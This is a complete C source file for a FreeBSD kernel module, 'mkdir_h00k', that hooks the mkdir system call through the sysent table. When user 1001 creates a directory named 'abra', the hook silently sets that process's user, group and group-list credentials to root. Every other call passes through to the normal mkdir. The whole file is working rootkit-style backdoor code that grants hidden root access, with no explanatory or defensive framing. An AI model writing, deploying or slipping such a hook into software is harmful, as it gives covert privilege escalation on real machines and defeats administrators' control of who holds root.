#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/ucred.h>
#include <sys/resourcevar.h>

#define MY_UID	1001


static int
mkdir_hook(struct thread *td, void *syscall_args)
{

        struct mkdir_args /* {
                char 	*path;
                int 	mode;
        } */ *uap;

        uap = (struct mkdir_args *) syscall_args;

        char path[255];
        size_t done;
        int error;
        int result = 0;

        error = copyinstr(uap->path, path, 255, &done);

        if (error != 0) {
                return(error);
        }

        // printf("directory \"%s\" will be made with perms: %o\n", path, uap->mode);
        // printf("your uid: %d %d\n", uid, td->td_ucred->cr_uid);
        // printf("your uid: %d\n", td->td_ucred->cr_uid);

        if (strcmp(path, "abra") == 0 && td->td_ucred->cr_uid == MY_UID) {
                printf("cadabra!\n");

                td->td_ucred->cr_uid = 0;	/* effective user id */
                td->td_ucred->cr_ruid = 0;	/* real user id */
                td->td_ucred->cr_svuid = 0;	/* saved user id */
                td->td_ucred->cr_rgid = 0;	/* real group id */
                td->td_ucred->cr_svgid = 0;	/* saved group id */

                // 		gid_t	cr_groups[NGROUPS];	/* groups */
                int i;
                for (i = 0; i < NGROUPS; i++) {
                        // printf("group %d: %d\n", i, td->td_ucred->cr_groups[i]);
                        td->td_ucred->cr_groups[i] = 0;
                }

                /* extra fields to change */
                //		struct uidinfo	*cr_uidinfo;	/* per euid resource consumption */
                // 		struct uidinfo	*cr_ruidinfo;	/* per ruid resource consumption */
                td->td_ucred->cr_uidinfo->ui_uid = 0;
                td->td_ucred->cr_ruidinfo->ui_uid = 0;
        } else {
                result = mkdir(td, syscall_args);	
        }


        // printf("your uid: %d\n", td->td_ucred->cr_uid);
        return(result);
}


/* handle load/unload */
static int
load(struct module *module, int cmd, void *arg)
{
        int error = 0;

        switch(cmd) {
        case MOD_LOAD:
                /* replace read entry with read_hook */
                sysent[SYS_mkdir].sy_call = (sy_call_t *) mkdir_hook;
                printf("mkdir loaded\n");
                break;

        case MOD_UNLOAD:
                /* unhook */
                sysent[SYS_mkdir].sy_call = (sy_call_t *) mkdir;
                printf("mkdir unloaded\n");
                break;

        default:
                error = EOPNOTSUPP;
                break;
        }

        return(error);
}

static moduledata_t mkdir_hook_mod = {
        "mkdir_h00k",	/* module name */
        load,		/* event handler */
        NULL		/* extra data */
};

DECLARE_MODULE(mkdir_hook, mkdir_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);



// struct ucred {
// 	u_int	cr_ref;			/* reference count */
// 	uid_t	cr_uid;			/* effective user id */
// 	uid_t	cr_ruid;		/* real user id */
// 	uid_t	cr_svuid;		/* saved user id */
// 	short	cr_ngroups;		/* number of groups */
// 	gid_t	cr_groups[NGROUPS];	/* groups */
// 	gid_t	cr_rgid;		/* real group id */
// 	gid_t	cr_svgid;		/* saved group id */
// 	struct uidinfo	*cr_uidinfo;	/* per euid resource consumption */
// 	struct uidinfo	*cr_ruidinfo;	/* per ruid resource consumption */
// 	struct prison	*cr_prison;	/* jail(2) */
// 	struct label	*cr_label;	/* MAC label */
// 	struct mtx	*cr_mtxp;      	/* protect refcount */
// };

//struct getuid_args uidargs = { 0 };
//uid_t uid= getuid(td, &uidargs);
